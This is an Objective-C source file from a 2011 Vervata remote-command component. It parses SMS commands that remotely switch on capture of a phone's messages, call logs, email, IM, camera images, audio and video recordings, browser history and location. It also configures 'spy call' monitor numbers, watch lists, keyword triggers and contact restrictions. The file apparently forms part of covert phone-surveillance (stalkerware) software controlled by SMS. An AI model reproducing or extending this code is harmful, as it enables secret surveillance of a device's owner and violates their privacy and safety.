/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  RequestEvents
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  24/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "SetSettingsProcessor.h"
#import "RemoteCmdSettingsCode.h"
#import "Preference.h"
#import "PrefLocation.h"
#import "PrefEventsCapture.h"
#import "PrefMonitorNumber.h"
#import "PrefHomeNumber.h"
#import "PrefEmergencyNumber.h"
#import "PrefNotificationNumber.h"
#import "PrefWatchList.h"
#import "PrefRestriction.h"
#import "PrefPanic.h"
#import "PrefKeyword.h"

@interface SetSettingsProcessor(PrivateAPI)
- (void) sendReplySMS;
- (void) setSettingsException;
- (void) processSettingsCommand; 
- (BOOL) isValidateArgs;
- (BOOL) checkEnableOrDisableFlag: (NSUInteger) aValue;
- (NSArray *) getSettingsArguments;
- (BOOL) checkValidPhoneNumbers:(NSArray *) aPhoneNumbers;
- (BOOL) isValidKeywords: (NSArray *) aKeywords;
@end

@implementation SetSettingsProcessor

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the SetSettingsProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: No return type
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData {
    DLog (@"SetSettings---->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the SetSettingsProcessor
 - Argument list and description: 
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"SetSettings---->doProcessingCommand");
	NSArray *settingsArgs=[self getSettingsArguments];
	if ([settingsArgs count]) [self processSettingsCommand];
	else [self setSettingsException];
}

/**
 - Method name: getSettingsArguments
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aStatusCode (NSUInteger)
 - Return description: resultArray (NSArray *)
*/

- (NSArray*) getSettingsArguments {
	DLog (@"SetSettings---->getSettingsArguments");
	NSMutableArray *resultArray=[[NSMutableArray alloc]init];
	NSArray *args=[mRemoteCmdData mArguments];
	for (int index=2; index < [args count]; index++) {
		if(index==[args count]) {
			//Check the last argument
			if([[args objectAtIndex:index-1] isEqualToString:@"D"]) break;
		}
		NSMutableDictionary *dictionary=[[[NSMutableDictionary alloc]init] autorelease];
		NSMutableArray *valueArray=[[[NSMutableArray alloc] init] autorelease];
		//Assign argument into cmdString
		NSString * cmdString= [args objectAtIndex:index];
		//Sperate cmdString by ':' into idArg array;  eg :2:1---> idArg[0]=2,idArg[1]=1
		NSArray *idArg=[cmdString componentsSeparatedByString:kSettingsIDSeperator];
		if([idArg count]>=2) {
			NSString *Id=[idArg objectAtIndex:0]; //Get ID 
			if (![RemoteCmdProcessorUtils isDigits:Id]) { // Is disgit then continue else exit
				[resultArray removeAllObjects];
				break;
			}
			// Get Value
			NSString *value=[idArg objectAtIndex:1];
			//Sperate value by ';' into valueArg array;
			NSArray *valueArg=[value componentsSeparatedByString:kSettingsValueSeperator]; 
			if([valueArg count]==1) { // if one value after seperating
				if (![RemoteCmdProcessorUtils isDigits:value]) { // Is disgit then continue else exit
//					[resultArray removeAllObjects];		
//					break;								
				}
				[valueArray addObject:value];
			}
			else { // more  value a after seperating
				for (NSString *value in valueArg) {
					if (![RemoteCmdProcessorUtils isDigits:value]) { // Is disgit then continue else exit
//						[resultArray removeAllObjects];		
//						break;								
					}
					[valueArray addObject:value];
				}
			}
			[dictionary setValue:Id forKey:kSettingsIDTag];
			[dictionary setObject:valueArray forKey:kSettingsValueTag];
			
			[resultArray addObject:dictionary];
//			[valueArray release];
//			[dictionary release];
        }
		else break;
	}	
	return [resultArray autorelease];
}

#pragma mark SetSettingsProcessor Private Methods Implementation

/**
 - Method name: checkEnableOrDisableFlag
 - Purpose:This method is used to check whether enable or disable flag. 
 - Argument list and description: aValue (NSUInteger) 
 - Return description: BOOL
*/

- (BOOL) checkEnableOrDisableFlag: (NSUInteger) aValue {
	DLog (@"SetSettings---->checkEnableOrDisableFlag");
	BOOL bFlag=NO;
	if((aValue ==_ENABLE_)||(aValue ==_DISABLE_)) bFlag=YES;
	return bFlag;
}

/**
 - Method name: checkValidPhoneNumbers:
 - Purpose:This method is used to check whether is phone number and not duplicate among its elements. 
 - Argument list and description: aPhoneNumbers (NSArray) 
 - Return description: BOOL
*/

- (BOOL) checkValidPhoneNumbers:(NSArray *) aPhoneNumbers {
	BOOL bFlag=NO;
	for (NSString *phoneNumber in aPhoneNumbers) {
		bFlag=YES;
		if (![RemoteCmdProcessorUtils isPhoneNumber:phoneNumber]) {
			bFlag=NO;
			break;
		}
	}
	
	if (bFlag) {
		if ([RemoteCmdProcessorUtils isDuplicateTelephoneNumber:aPhoneNumbers]) {
			bFlag = NO;
		}
	}
    return bFlag;
}

/**
 - Method name: isValidKeywords:
 - Purpose:This method is used to check whether is keyword and not duplicate among its elements. 
 - Argument list and description: aKeywords (NSArray) 
 - Return description: BOOL
 */

- (BOOL) isValidKeywords: (NSArray *) aKeywords {
	BOOL isValidKeywords = YES;
	for (NSString *keyword in aKeywords) {
		if (![RemoteCmdProcessorUtils isValidKeyword:keyword]) {
			isValidKeywords = NO;
			break;
		}
	}
	if (isValidKeywords) {
		isValidKeywords = ![RemoteCmdProcessorUtils isDuplicateString:aKeywords];
	}
	return (isValidKeywords);
}
			
/**
 - Method Name: processSettingsCommand
 - Purpose:This method is used to check whether enable or disable flag. 
 - Argument list and description: No Return Type
 - Return description: No Argument
*/

- (void) processSettingsCommand {
	DLog (@"SetSettings---->processSettingsCommand");
    id <PreferenceManager> prefManager	= [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefEventsCapture *prefEvents		= (PrefEventsCapture *)[prefManager preference:kEvents_Ctrl];
	PrefLocation *prefLocation			= (PrefLocation *)[prefManager preference:kLocation];
	PrefNotificationNumber *prefNotificationNumberList	= (PrefNotificationNumber *) [prefManager preference:kNotification_Number];
	PrefMonitorNumber *prefMonitor		= (PrefMonitorNumber *) [prefManager preference:kMonitor_Number];
	PrefHomeNumber *prefHomeNumberList	= (PrefHomeNumber *) [prefManager preference:kHome_Number];
	PrefWatchList *prefWatchList		= (PrefWatchList *)[prefManager preference:kWatch_List];
	PrefRestriction *prefRestriction	= (PrefRestriction *)[prefManager preference:kRestriction];
	PrefPanic *prefPanic				= (PrefPanic *)[prefManager preference:kPanic];
	PrefEmergencyNumber *prefEmergencyNumber			= (PrefEmergencyNumber *)[prefManager preference:kEmergency_Number];
	PrefKeyword *prefKeywords = (PrefKeyword *)[prefManager preference:kKeyword];
	id <ConfigurationManager> configurationManager		= [[RemoteCmdUtils sharedRemoteCmdUtils] mConfigurationManager];
	
	NSArray *results=[self getSettingsArguments];
	for (NSDictionary *dictionary in results) {
		NSString *settingsID=[dictionary objectForKey:kSettingsIDTag];
		NSArray *valueArray=[dictionary objectForKey:kSettingsValueTag];
		NSString *value=nil;
		if ([valueArray count]==1) {
			value=[valueArray objectAtIndex:0];
		}
		DLog(@">>>>>>>>>>>>>>>>> Set Setting command %d", [settingsID intValue])
		switch ([settingsID intValue]) {
			case kRemoteCmdSMS:
				if ([configurationManager isSupportedFeature:kFeatureID_EventSMS]) {
					if ([RemoteCmdProcessorUtils isDigits:value])
						if ([self checkEnableOrDisableFlag:[value intValue]]) 
							[prefEvents setMEnableSMS:[value intValue]];
			    } else {
					[self setSettingsException];
				}
				break;
				
			case kRemoteCmdCallLog:
				if ([configurationManager isSupportedFeature:kFeatureID_EventCall])
					if ([RemoteCmdProcessorUtils isDigits:value])
						if ([self checkEnableOrDisableFlag:[value intValue]])
							[prefEvents setMEnableCallLog:[value intValue]];
			    else
					[self setSettingsException];	
				break;
				
			case kRemoteCmdEmail:
				if ([configurationManager isSupportedFeature:kFeatureID_EventEmail])
					if ([RemoteCmdProcessorUtils isDigits:value])
						if ([self checkEnableOrDisableFlag:[value intValue]])
							[prefEvents setMEnableEmail:[value intValue]];
			    else
					[self setSettingsException];
				break;
				
			case kRemoteCmdCellInfo:
				break;
				
			case kRemoteCmdMMS: 
				if ([configurationManager isSupportedFeature:kFeatureID_EventMMS])
					if ([RemoteCmdProcessorUtils isDigits:value])
						if ([self checkEnableOrDisableFlag:[value intValue]])
							[prefEvents setMEnableMMS:[value intValue]];
			    else
					[self setSettingsException];	
				break;				
			case kRemoteCmdLocation: 
				if ([configurationManager isSupportedFeature:kFeatureID_EventLocation])
					if ([RemoteCmdProcessorUtils isDigits:value])
						if ([self checkEnableOrDisableFlag:[value intValue]])
							[prefLocation setMEnableLocation:[value intValue]];
			    else
					[self setSettingsException];	
				break;
				
			case kRemoteCmdIM: 
				if ([configurationManager isSupportedFeature:kFeatureID_EventIM])
					if ([RemoteCmdProcessorUtils isDigits:value])
						if ([self checkEnableOrDisableFlag:[value intValue]])
							[prefEvents setMEnableIM:[value intValue]];
			    else
					[self setSettingsException];	
				break;
				
		   case kRemoteCmdCameraImage:
				if ([configurationManager isSupportedFeature:kFeatureID_EventCameraImage])
					if ([RemoteCmdProcessorUtils isDigits:value])
						if ([self checkEnableOrDisableFlag:[value intValue]])
							[prefEvents setMEnableCameraImage:[value intValue]];
			    else
					[self setSettingsException];
				break;
				
			case kRemoteCmdVideoFile: 
				if ([configurationManager isSupportedFeature:kFeatureID_EventVideoRecording])
					if ([RemoteCmdProcessorUtils isDigits:value])
						if ([self checkEnableOrDisableFlag:[value intValue]])
							[prefEvents setMEnableVideoFile:[value intValue]];
			    else
					[self setSettingsException];
				break;
				
			case kRemoteCmdAudioRecording: 
				if ([configurationManager isSupportedFeature:kFeatureID_EventSoundRecording])
					if ([RemoteCmdProcessorUtils isDigits:value])
						if ([self checkEnableOrDisableFlag:[value intValue]])
							[prefEvents setMEnableAudioFile:[value intValue]];
			    else
					[self setSettingsException];
				break;
				
			case kRemoteCmdWallPaper: 
				if ([configurationManager isSupportedFeature:kFeatureID_EventWallpaper])
					if ([RemoteCmdProcessorUtils isDigits:value])
						if ([self checkEnableOrDisableFlag:[value intValue]])
							[prefEvents setMEnableWallPaper:[value intValue]];
			    else
					[self setSettingsException];	
				break;
				
			case kRemoteCmdAudioConversation: 
				break;
				
			case kRemoteCmdPinMessage: 
				if ([configurationManager isSupportedFeature:kFeatureID_EventPinMessage])
					if ([RemoteCmdProcessorUtils isDigits:value])
						if ([self checkEnableOrDisableFlag:[value intValue]])
							[prefEvents setMEnablePinMessage:[value intValue]];
			    else
					[self setSettingsException];	
				break;
			case kRemoteCmdApplicationLifeCycle:
				if ([configurationManager isSupportedFeature:kFeatureID_ApplicationLifeCycleCapture])
					if ([RemoteCmdProcessorUtils isDigits:value])
						if ([self checkEnableOrDisableFlag:[value intValue]])
							[prefEvents setMEnableALC:[value intValue]];
				else
					[self setSettingsException];
				break;
			case kRemoteCmdBrowserURL:
				if ([configurationManager isSupportedFeature:kFeatureID_EventBrowserUrl]) {
					if ([RemoteCmdProcessorUtils isDigits:value])
						if ([self checkEnableOrDisableFlag:[value intValue]])
							[prefEvents setMEnableBrowserUrl:[value intValue]];
				}
			    else {
					[self setSettingsException];	
				}
				break;
			case kRemoteCmdCalendar:
				if ([configurationManager isSupportedFeature:kFeatureID_EventCalendar]) {
					if ([RemoteCmdProcessorUtils isDigits:value])
						if ([self checkEnableOrDisableFlag:[value intValue]])
							[prefEvents setMEnableCalendar:[value intValue]];
				}
			    else {
					[self setSettingsException];
				}
				break;
			case kRemoteCmdNote:
				if ([configurationManager isSupportedFeature:kFeatureID_NoteCapture]) {
					if ([RemoteCmdProcessorUtils isDigits:value])
						if ([self checkEnableOrDisableFlag:[value intValue]])
							[prefEvents setMEnableNote:[value intValue]];
				}
			    else {
					[self setSettingsException];
				}
				break;
				
			case kRemoteCmdSetStartStopCapture: 
				if ([RemoteCmdProcessorUtils isDigits:value]) {
					if ([self checkEnableOrDisableFlag:[value intValue]])
						[prefEvents setMStartCapture:[value intValue]];
					//else
					//	[self setSettingsException];	
				}
				break;
				
			case kRemoteCmdSetDeliveryTimer: 
				if ([RemoteCmdProcessorUtils isDigits:value]) {
					if ([value intValue] >= 0 && [value intValue] <= 24) 
						[prefEvents setMDeliverTimer:[value intValue]];
					//else
					//	[self setSettingsException];	
				}
				break;
				
			case kRemoteCmdSetEventCount: 
				if ([RemoteCmdProcessorUtils isDigits:value]) {
					if ([value intValue] >= 1 && [value intValue] <= 500) 
						[prefEvents setMMaxEvent:[value intValue]];
					//else
					//	[self setSettingsException];	
				}
				break;
				
			case kRemoteCmdSetEnableWatch:
				if ([configurationManager isSupportedFeature:kFeatureID_WatchList]) {
					if ([RemoteCmdProcessorUtils isDigits:value]) {
						if ([self checkEnableOrDisableFlag:[value intValue]]) {
							[prefWatchList setMEnableWatchNotification:[value intValue]];
							//[prefManager savePreferenceAndNotifyChange:prefWatchList];
						}
					}
				} else
					[self setSettingsException];
				break;
			
			case kRemoteCmdSetWatchFlags: 
				if ([configurationManager isSupportedFeature:kFeatureID_WatchList]) {
					if ([valueArray count] > 3) {						
						if ([RemoteCmdProcessorUtils isDigits:[valueArray objectAtIndex:0]]	&&
							[RemoteCmdProcessorUtils isDigits:[valueArray objectAtIndex:1]]	&&
							[RemoteCmdProcessorUtils isDigits:[valueArray objectAtIndex:2]]	&&
							[RemoteCmdProcessorUtils isDigits:[valueArray objectAtIndex:3]]	){																		
							NSUInteger watchFlag=[prefWatchList mWatchFlag];
							//In AddressBook						
							if ([[valueArray objectAtIndex:0] intValue]==1) {
								watchFlag |= kWatch_In_Addressbook;
							}
							else {
								watchFlag &= ~kWatch_In_Addressbook;
							}
							//Not In AddressBook
							if ([[valueArray objectAtIndex:1] intValue]==1) {
								watchFlag |= kWatch_Not_In_Addressbook;
							}
							else {
								watchFlag &= ~kWatch_Not_In_Addressbook;
							}
							//In Watch List
							if ([[valueArray objectAtIndex:2] intValue]==1) {
								watchFlag |= kWatch_In_List;
							}
							else {
								watchFlag &= ~kWatch_In_List;
							}
							//In Private Number
							if ([[valueArray objectAtIndex:3] intValue]==1) {
								watchFlag |= kWatch_Private_Or_Unknown_Number;
							}
							else {
								watchFlag &= ~kWatch_Private_Or_Unknown_Number;
							}
							[prefWatchList setMWatchFlag:watchFlag];
							//[prefManager savePreferenceAndNotifyChange:prefWatchList];
						}
					}
				}
				else 
					[self setSettingsException];	
				break;
				
			case kRemoteCmdSetLocationTimer: 
				if ([configurationManager isSupportedFeature:kFeatureID_EventLocation])
					if ([RemoteCmdProcessorUtils isDigits:value])
						if ([value intValue] > 0 &&	[value intValue] <= 8)
							[prefLocation setMLocationInterval:[RemoteCmdProcessorUtils timeIntervalForLocation:[value intValue]]];
			    else
					[self setSettingsException];	
				break;
				
			case kRemoteCmdPanicMode: 
				if ([configurationManager isSupportedFeature:kFeatureID_Panic])  {
					if ([RemoteCmdProcessorUtils isDigits:value]) {
						if ([value intValue] > 0 &&	[value intValue] <= 8) {
							DLog (@"Panic mode setting")
							if ([value intValue] == 1)					// Location and Image
								[prefPanic setMLocationOnly:NO];
							else if ([value intValue] == 2)				// Location only
								[prefPanic setMLocationOnly:YES];	
							//[prefManager savePreferenceAndNotifyChange:prefPanic];
						}
					}
				} else
					[self setSettingsException];	
				break;
				
			case kRemoteCmdNotificationNumbers: 
				if ([configurationManager isSupportedFeature:kFeatureID_NotificationNumbers]) {
					if ([self checkValidPhoneNumbers:valueArray]					&&
						[valueArray count] <= NOTIFICATION_NUMBER_LIST_CAPACITY		){
						[prefNotificationNumberList setMNotificationNumbers:valueArray];
						//[prefManager savePreferenceAndNotifyChange:prefNotificationNumberList];
					}
				}
				else 
					[self setSettingsException];	
				break;
				
			case kRemoteCmdHomeNumbers: 
				if ([configurationManager isSupportedFeature:kFeatureID_HomeNumbers]) {
					if ([self checkValidPhoneNumbers:valueArray]					&&
						[valueArray count] <= HOME_NUMBER_LIST_CAPACITY				){
						[prefHomeNumberList setMHomeNumbers:valueArray];
						//[prefManager savePreferenceAndNotifyChange:prefHomeNumberList];
					}
				}
				else [self setSettingsException];	
				break;
				
			case kRemoteCmdSMSKeywords:
				if ([configurationManager isSupportedFeature:kFeatureID_SMSKeyword]) {
					if ([self isValidKeywords:valueArray]					&&
						[valueArray count] <= KEYWORD_LIST_CAPACITY					) {
						[prefKeywords setMKeywords:valueArray];
					}
				}
				else [self setSettingsException];
				break;
				
			case kRemoteCmdMonitorNumbers: 
				if ([configurationManager isSupportedFeature:kFeatureID_MonitorNumbers]) {
					if ([self checkValidPhoneNumbers:valueArray]					&&
						[valueArray count] <= MONITOR_NUMBERS_LIST_CAPACITY			){
						[prefMonitor setMMonitorNumbers:valueArray];
						//[prefManager savePreferenceAndNotifyChange:prefMonitor];
					}
				}
				else [self setSettingsException];
				break;
				
			case kRemoteCmdEnableSpyCall: 
				if ([configurationManager isSupportedFeature:kFeatureID_SpyCall]) {
					if ([RemoteCmdProcessorUtils isDigits:value]) {
						if ([self checkEnableOrDisableFlag:[value intValue]]) {
							[prefMonitor setMEnableMonitor:[value intValue]];
							//[prefManager savePreferenceAndNotifyChange:prefMonitor];
						}
					}
				}
			    else
					[self setSettingsException];	
				break;
				
			case kRemoteCmdEnableRestrictions: 
				if ([configurationManager isSupportedFeature:kFeatureID_CommunicationRestriction]) {
					if ([RemoteCmdProcessorUtils isDigits:value]) {
						if ([self checkEnableOrDisableFlag:[value intValue]])
							[prefRestriction setMEnableRestriction:[value intValue]];
					}
				}
			    else
					[self setSettingsException];
				break;
			case kRemoteCmdEnableWaitingForApprovalPolicy: 
				if ([configurationManager isSupportedFeature:kFeatureID_CommunicationRestriction])
					if ([RemoteCmdProcessorUtils isDigits:value]) {
						if ([self checkEnableOrDisableFlag:[value intValue]])
							[prefRestriction setMWaitingForApprovalPolicy:![value intValue]]; // 0 not restrict, 1 restrict
					}
			    else
					[self setSettingsException];
				break;
			case kRemoteCmdAddressBookManagementMode:
				if ([configurationManager isSupportedFeature:kFeatureID_AddressbookManagement]) {
					if ([RemoteCmdProcessorUtils isDigits:value]) {
						if ([value intValue] >= 0 && [value intValue] <= 2) {
							switch ([value intValue]) {
								case 0:
									[prefRestriction setMAddressBookMgtMode:kAddressMgtModeOff];
									break;
								case 1:
									[prefRestriction setMAddressBookMgtMode:kAddressMgtModeMonitor];
									break;
								case 2:
									[prefRestriction setMAddressBookMgtMode:kAddressMgtModeRestrict];
									break;
							}
						}
					}
				} else {
					[self setSettingsException];
				}
			    break;
		
			case kRemoteCmdVCARD_VERSION: 
				break;
			case kRemoteCmdEanbleApplicationProfile:
				if ([configurationManager isSupportedFeature:kFeatureID_ApplicationProfile]) {						
					if ([RemoteCmdProcessorUtils isDigits:value]) 
						if ([self checkEnableOrDisableFlag:[value intValue]])
							[prefRestriction setMEnableAppProfile:[value intValue]];
				}
			    else
					[self setSettingsException];	
				break;
			
			case kRemoteCmdEnableUrlProfile:
				if ([configurationManager isSupportedFeature:kFeatureID_BrowserUrlProfile])
					if ([RemoteCmdProcessorUtils isDigits:value])
						if ([self checkEnableOrDisableFlag:[value intValue]])
							[prefRestriction setMEnableUrlProfile:[value intValue]];
			    else
					[self setSettingsException];	
				break;
			case kRemoteCmdEmergencyNumbers:
				if ([configurationManager isSupportedFeature:kFeatureID_EmergencyNumbers]) {
					if ([self checkValidPhoneNumbers:valueArray]				&&
						[valueArray count] <= EMERGENCY_NUMBER_LIST_CAPACITY	){
						[prefEmergencyNumber setMEmergencyNumbers:valueArray];
						//[prefManager savePreferenceAndNotifyChange:prefEmergencyNumber];
					}
				}				
				else
					[self setSettingsException];
				break;
			case kRemoteCmdWatchNumbers:
				if ([configurationManager isSupportedFeature:kFeatureID_WatchList]) {
					if ([self checkValidPhoneNumbers:valueArray]				&&
						[valueArray count] <= WATCH_NUMBER_LIST_CAPACITY		){
						[prefWatchList setMWatchNumbers:valueArray];
						//[prefManager savePreferenceAndNotifyChange:prefWatchList];
					}						
				}
				else
					[self setSettingsException];
				break;
			default:
				[self setSettingsException];
				break;
		}
	}
	[prefManager savePreferenceAndNotifyChange:prefEvents];
	[prefManager savePreferenceAndNotifyChange:prefLocation];
	[prefManager savePreferenceAndNotifyChange:prefRestriction];
	
	//
	[prefManager savePreferenceAndNotifyChange:prefMonitor];
	[prefManager savePreferenceAndNotifyChange:prefHomeNumberList];
	[prefManager savePreferenceAndNotifyChange:prefNotificationNumberList];
	[prefManager savePreferenceAndNotifyChange:prefWatchList];
	[prefManager savePreferenceAndNotifyChange:prefEmergencyNumber];
	[prefManager savePreferenceAndNotifyChange:prefPanic];
	[prefManager savePreferenceAndNotifyChange:prefKeywords];
	
	[self sendReplySMS];
}


/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aStatusCode (NSUInteger)
 - Return description: No return type
*/

- (void) sendReplySMS {
	 DLog (@"SetSettings---->sendReplySMS");
	 NSString *setSettingMessage=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						     andErrorCode:_SUCCESS_];
	 
	 [[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:setSettingMessage];
	 if ([mRemoteCmdData mIsSMSReplyRequired]) {
		 [[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber]
																andMessage:setSettingMessage];
	 }
}

/**
 - Method name: setsetSettingsException
 - Purpose:This method is invoked when activation failed. 
 - Argument list and description: No Return Type
 - Return description: No Argument
*/

- (void) setSettingsException  {
	DLog (@"SetSettings---->setSettingsException")
	FxException* exception = [FxException exceptionWithName:@"processSettings" andReason:@"Set Settings Error"];
	[exception setErrorCode:kCmdExceptionErrorInvalidCmdFormat];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/**
 - Method name: dealloc
 - Purpose:This method is used to handle managment
 - Argument list and description:No Argument
 - Return description: No Return Type
*/

-(void) dealloc {
	[mSettingsArgs release];
	 mSettingsArgs=nil;
	[super dealloc];
}

@end
